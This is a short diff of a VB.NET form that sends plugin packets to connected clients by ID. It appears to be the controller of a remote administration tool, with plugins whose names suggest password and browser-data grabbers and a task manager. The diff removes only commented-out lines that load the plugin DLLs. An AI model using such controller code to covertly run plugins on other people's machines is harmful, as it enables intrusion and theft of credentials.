@@ -17,7 +17,6 @@ Public Class Client_Form
         Dim P As New PacketMaker
         P.Type_Packet = PacketType.PLUGIN
         P.Plugin = Plugins._PW
-        'IO.File.ReadAllBytes("Plugins\PW.dll")
 
         For Each U As Clients In Form1.L
 
@@ -36,7 +35,6 @@ Public Class Client_Form
         Dim P As New PacketMaker
         P.Type_Packet = PacketType.PLUGIN
         P.Plugin = Plugins._WB
-        'IO.File.ReadAllBytes("Plugins\WB.dll")
 
         For Each U As Clients In Form1.L
 
@@ -54,8 +52,6 @@ Public Class Client_Form
         Dim P As New PacketMaker
         P.Type_Packet = PacketType.PLUGIN
         P.Plugin = Plugins._W_PW
-        'IO.File.ReadAllBytes("Plugins\NW.dll")
-
         For Each U As Clients In Form1.L
 
             If U.ID = Me.Text Then
@@ -78,11 +74,8 @@ Public Class Client_Form
         Dim P As New PacketMaker
         P.Type_Packet = PacketType.PLUGIN
         P.Plugin = Plugins._TASKS_MGR
-        'IO.File.ReadAllBytes("Plugins\TM.dll")
-
 
         P.Function_Params = New Object() {Packet_Subject.RETRIEVE_TASKS}
-        'New Object() {}
 
         For Each U As Clients In Form1.L
 
